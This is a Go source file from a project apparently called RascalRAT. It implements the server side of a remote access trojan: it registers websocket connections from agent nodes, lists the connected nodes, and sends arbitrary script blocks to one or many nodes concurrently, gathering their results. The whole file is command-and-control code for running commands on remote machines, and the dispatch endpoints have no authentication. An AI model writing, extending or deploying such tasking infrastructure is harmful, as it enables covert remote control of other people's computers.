package ws

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"errors"
	"net/http"
	"sync"
	"time"

	"log/slog"

	"github.com/coder/websocket"
	"github.com/its-ernest/RascalRAT/internal/protocol"
	"github.com/labstack/echo/v5"
)

func newTaskID() string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err != nil {
		return "task-" + time.Now().Format("150405.000")
	}
	return "task-" + hex.EncodeToString(b)
}

func AcceptAgentWebSocket(c *echo.Context, hub *Hub) error {
	r := c.Request()

	nodeID := r.Header.Get("X-Node-ID")
	if nodeID == "" {
		nodeID = r.URL.Query().Get("id")
	}
	if nodeID == "" {
		return c.String(http.StatusBadRequest, "Missing node identity declaration")
	}

	slog.Info("websocket upgrade request", "node_id", nodeID, "origin", r.Header.Get("Origin"), "remote", r.RemoteAddr)

	options := &websocket.AcceptOptions{
		OriginPatterns:  []string{"localhost:*", "127.0.0.1:*"},
		CompressionMode: websocket.CompressionContextTakeover,
	}

	wsConn, err := websocket.Accept(c.Response(), r, options)
	if err != nil {
		slog.Error("failed to upgrade connection to websocket", "node_id", nodeID, "err", err)
		return err
	}
	wsConn.SetReadLimit(4 << 20)

	session := hub.Register(nodeID, wsConn)
	slog.Info("new node connection established via websocket", "node_id", nodeID, "remote", r.RemoteAddr)
	session.Start(hub)

	return nil
}

// ListNodes returns the roster of currently connected agent nodes.
func ListNodes(c *echo.Context, hub *Hub) error {
	return c.JSON(http.StatusOK, hub.List())
}

// dispatchOne delivers a single task to one node and waits for its response.
// It returns the response together with the HTTP status that should be
// reported to the caller when this node is the sole target.
func dispatchOne(hub *Hub, nodeID string, req protocol.TaskRequest) (protocol.TaskResponse, int, error) {
	session, err := hub.GetSession(nodeID)
	if err != nil {
		return protocol.TaskResponse{}, http.StatusNotFound, err
	}

	respChan := make(chan protocol.TaskResponse, 1)
	session.RegisterTaskChan(req.TaskID, respChan)
	defer session.DeregisterTaskChan(req.TaskID)

	select {
	case session.Send <- req:
	default:
		slog.Warn("send queue saturated", "node_id", nodeID, "task_id", req.TaskID)
		return protocol.TaskResponse{}, http.StatusServiceUnavailable, errors.New("agent is currently busy")
	}

	taskCtx, taskCancel := context.WithTimeout(context.Background(), req.Timeout+2*time.Second)
	defer taskCancel()

	select {
	case response := <-respChan:
		return response, http.StatusOK, nil
	case <-taskCtx.Done():
		if errors.Is(taskCtx.Err(), context.DeadlineExceeded) {
			return protocol.TaskResponse{}, http.StatusGatewayTimeout, errors.New("endpoint task execution exceeded specified timeout thresholds")
		}
		return protocol.TaskResponse{}, http.StatusInternalServerError, errors.New("request context cancelled during tracking")
	}
}

func DispatchTask(c *echo.Context, hub *Hub) error {
	nodeID, err := echo.PathParam[string](c, "id")
	if err != nil {
		return c.JSON(http.StatusBadRequest, map[string]string{"error": "missing node target context"})
	}

	var req protocol.TaskRequest
	if err := c.Bind(&req); err != nil {
		return c.JSON(http.StatusBadRequest, map[string]string{"error": "malformed task request body"})
	}
	if req.TaskID == "" {
		req.TaskID = newTaskID()
	}

	resp, status, derr := dispatchOne(hub, nodeID, req)
	if derr != nil {
		return c.JSON(status, map[string]string{"error": derr.Error()})
	}
	return c.JSON(status, resp)
}

// MultiTaskRequest conveys one administrative instruction to many nodes at once.
type MultiTaskRequest struct {
	NodeIDs     []string      `json:"node_ids"`
	PayloadType string        `json:"payload_type"`
	ScriptBlock string        `json:"script_block"`
	Timeout     time.Duration `json:"timeout"`
}

// DispatchTaskMulti fans a single task out to every selected node concurrently
// and returns a per-node map of responses plus the status for each node.
func DispatchTaskMulti(c *echo.Context, hub *Hub) error {
	var req MultiTaskRequest
	if err := c.Bind(&req); err != nil {
		return c.JSON(http.StatusBadRequest, map[string]string{"error": "malformed task request body"})
	}
	if len(req.NodeIDs) == 0 {
		return c.JSON(http.StatusBadRequest, map[string]string{"error": "node_ids is required"})
	}

	base := newTaskID()
	responses := make(map[string]protocol.TaskResponse)
	statuses := make(map[string]int)
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, nodeID := range req.NodeIDs {
		wg.Add(1)
		go func(id string) {
			defer wg.Done()

			taskReq := protocol.TaskRequest{
				TaskID:      base + "-" + id,
				PayloadType: req.PayloadType,
				ScriptBlock: req.ScriptBlock,
				Timeout:     req.Timeout,
			}

			resp, status, derr := dispatchOne(hub, id, taskReq)

			mu.Lock()
			defer mu.Unlock()
			if derr != nil {
				responses[id] = protocol.TaskResponse{TaskID: taskReq.TaskID, Success: false, ErrorMessage: derr.Error()}
				statuses[id] = status
				return
			}
			responses[id] = resp
			statuses[id] = status
		}(nodeID)
	}

	wg.Wait()
	return c.JSON(http.StatusOK, map[string]any{"responses": responses, "statuses": statuses})
}
